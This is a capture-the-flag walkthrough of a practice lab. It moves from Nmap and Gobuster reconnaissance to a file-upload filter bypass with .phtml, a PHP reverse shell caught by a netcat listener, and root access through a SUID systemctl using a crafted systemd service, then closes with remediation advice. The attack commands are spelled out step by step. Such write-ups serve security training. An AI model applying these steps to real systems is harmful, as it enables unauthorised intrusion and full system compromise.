1 Reconnaissance — Nmap Scan

Every attack begins with understanding the target. We start with an Nmap scan to discover open ports and running services:

Nmap — Full Port Scan with Version Detection
nmap -sCV -p- 10.112.188.171 -T4
PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.5 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 139/tcp open netbios-ssn Samba smbd 4 445/tcp open netbios-ssn Samba smbd 4 3128/tcp open http-proxy Squid http proxy 4.10 3333/tcp open http Apache httpd 2.4.41 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
💡 Understanding Nmap flags:
  • -sV — Probe ports to determine service/version info
  • -sC — Run default Nmap scripts for additional enumeration
  • -p- — Scan all 65,535 ports (not just the top 1,000)
  • -T4 — Aggressive timing (faster scan, but more noise)

Six ports open:

Port Service Version Significance
21 FTP vsftpd 3.0.5 File Transfer Protocol — potential anonymous login
22 SSH OpenSSH 8.2p1 Secure Shell — target for credential-based access
139/445 Samba smbd 4 Windows file sharing on Linux — enumerate shares
3128 Squid Proxy 4.10 HTTP proxy — could be useful for pivoting
3333 Apache 2.4.41 Web server — our primary entry point

The web server on port 3333 is our main target. The operating system is Ubuntu Linux — confirmed by the SSH and Apache version strings.

2 Directory Enumeration — Gobuster

With the web server identified, we need to discover hidden directories and files. Gobuster is a fast directory brute-forcing tool that works through a wordlist, testing each entry against the target URL:

Gobuster — Directory Brute Force
gobuster dir -u http://10.112.188.171:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 50
💡 Gobuster flags explained:
  • dir — Directory/file enumeration mode
  • -u — Target URL
  • -w — Path to wordlist (dictionary of directory names to try)
  • -t 50 — Use 50 concurrent threads for speed
/images (Status: 301) /css (Status: 301) /js (Status: 301) /internal (Status: 301)

Four directories found. /images, /css, and /js are standard static asset folders. But /internal/ stands out — it's not linked anywhere on the main site and contains an upload form.

3 Bypassing the File Upload Filter

The upload form accepts files, but the server applies a filter to block dangerous file types. Since the server runs Apache on Ubuntu, our goal is to upload a PHP reverse shell. However, the .php extension is blocked.

We need to fuzz the upload to find which extensions are allowed. Using Burp Suite Intruder, we capture an upload request and test multiple PHP-related extensions:

Wordlist — PHP Extension Variants
.php
.php3
.php4
.php5
.phtml
💡 How Burp Suite Intruder works:
  1. Intercept the file upload request with Burp Suite Proxy
  2. Send the request to Intruder
  3. Set the attack type to Sniper
  4. Mark the file extension as the payload position with § markers
  5. Load the extension wordlist as payloads
  6. Run the attack — each request tests a different extension
  7. Compare response lengths to find which extension was accepted
.php → Blocked (extension not allowed) .php3 → Blocked .php4 → Blocked .php5 → Blocked .phtml → ✅ ACCEPTED — Upload successful!

The .phtml extension is allowed. On Apache, .phtml files are often configured to be processed as PHP — exactly what we need.

4 Uploading the Reverse Shell

Now we prepare a PHP reverse shell. A reverse shell works by having the target machine connect back to us, giving us command-line access. Here's how it works:

  1. We start a listener on our AttackBox waiting for a connection
  2. We upload the PHP shell to the target
  3. When we visit the uploaded file in a browser, the PHP code executes
  4. The shell connects back to our listener, giving us a terminal on the target
AttackBox — Start Netcat Listener
nc -lvnp 4321

We use a standard PHP reverse shell, modified with our AttackBox IP and saved with the .phtml extension. After uploading it through the form, we navigate to the uploads directory to trigger execution:

Browser — Trigger the Shell
http://10.112.188.171:3333/internal/uploads/shell.phtml
Connection received on 10.112.188.171 46184 Linux ip-10-112-188-171 5.15.0-139-generic ... x86_64 uid=33(www-data) gid=33(www-data) groups=33(www-data)
✅ Shell obtained! We're connected as www-data, the Apache web server user. This is a low-privilege account — we need to escalate.

Let's upgrade to a proper interactive shell:

Upgrade to Interactive PTY Shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z
stty raw -echo; fg
# Press Enter

6 Understanding SUID — The Privilege Escalation Vector

Before we escalate, let's understand the vulnerability we're about to exploit.

What is SUID?

SUID (Set owner User ID) is a special permission bit on Linux files. Normally, when you run a program, it executes with your user permissions. But if the SUID bit is set, the program runs with the permissions of the file owner instead — usually root.

Think of it like borrowing an ID card. You walk into a building and the security guard checks your ID — you get your access level. But if you're holding the CEO's ID card (the SUID bit), the guard treats you as the CEO and lets you go anywhere.

The Classic Example: /usr/bin/passwd

Check SUID on passwd
ls -la /usr/bin/passwd
-rwsr-xr-x 1 root root 59976 Feb 6 2024 /usr/bin/passwd

Notice the s in -rws — that's the SUID bit. The file is owned by root. When a normal user runs passwd to change their password, the program needs to write to /etc/shadow — a file only root can modify. SUID temporarily elevates the user to root for that specific task only.

The Danger: SUID on systemctl

systemctl is the command used to start, stop, enable, and manage system services. It should never have the SUID bit — because anyone who can run systemctl as root can create a malicious service that executes arbitrary commands with full root privileges.

7 Enumerating SUID Binaries

We search the entire filesystem for files with the SUID bit set:

Find All SUID Binaries
find / -perm -4000 -type f 2>/dev/null
💡 Understanding the find command:
  • / — Search from the root of the filesystem
  • -perm -4000 — Find files with the SUID bit set (4000 in octal)
  • -type f — Only regular files (not directories)
  • 2>/dev/null — Suppress "Permission denied" errors
/usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /bin/su /bin/mount /bin/umount /bin/systemctl ← This one is NOT normal! /bin/fusermount /sbin/mount.cifs
Binary SUID Normal? Why
/bin/su ✅ Yes Needs root to switch users
/bin/mount ✅ Yes Needs root to mount filesystems
/bin/umount ✅ Yes Needs root to unmount filesystems
/bin/systemctl ❌ NO Allows any user to create root-level services — this is the vulnerability!
🎯 The anomaly: /bin/systemctl does not normally have the SUID bit. This was intentionally set by the room creator as a privilege escalation path. If you can run systemctl as root, you can create a malicious service that executes any command with full root privileges.

8 Exploiting systemctl SUID for Root

We exploit the SUID systemctl by creating a malicious systemd service. Systemd services define commands to run, and since systemctl runs as root, our service commands will execute as root too.

Step-by-step Exploit

1. Create a malicious service file:

Create Root-Privileged Service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/root_flag"
[Install]
WantedBy=multi-user.target' > /tmp/root.service

This service does one thing: reads the root flag and copies it to a location we can access.

2. Link and enable the service:

Link and Start the Malicious Service
systemctl link /tmp/root.service
systemctl enable --now /tmp/root.service
💡 What these commands do:
  • systemctl link — Makes systemd aware of our service file
  • systemctl enable --now — Enables the service to run at boot AND starts it immediately
  • Because systemctl has the SUID bit, all of this runs as root

3. Read the root flag:

Read the Exfiltrated Root Flag
cat /tmp/root_flag
🏁 Root Flag
THM{REDACTED}
🎉 Root obtained! The malicious service executed as root, read the protected root flag, and wrote it to a world-readable location. This same technique could be used for full system compromise — reverse shells, adding users, or installing backdoors.

🛡️ Remediation Advice

Issue Severity Fix
Unrestricted file upload with insufficient extension filtering Critical Use a strict allowlist of permitted extensions (e.g., .jpg, .png only). Validate file content, not just the extension. Store uploads outside the web root or with .htaccess disabling PHP execution.
.phtml files executed as PHP High Configure Apache to only execute .php files. Remove .phtml from the PHP handler configuration in /etc/apache2/mods-enabled/php*.conf.
SUID bit on /bin/systemctl Critical Remove the SUID bit immediately: chmod -s /bin/systemctl. Systemctl should never be SUID — it allows any user to create root-level services.
User flag readable by www-data Medium Set proper home directory permissions: chmod 750 /home/bill so only the owner and group can access it.
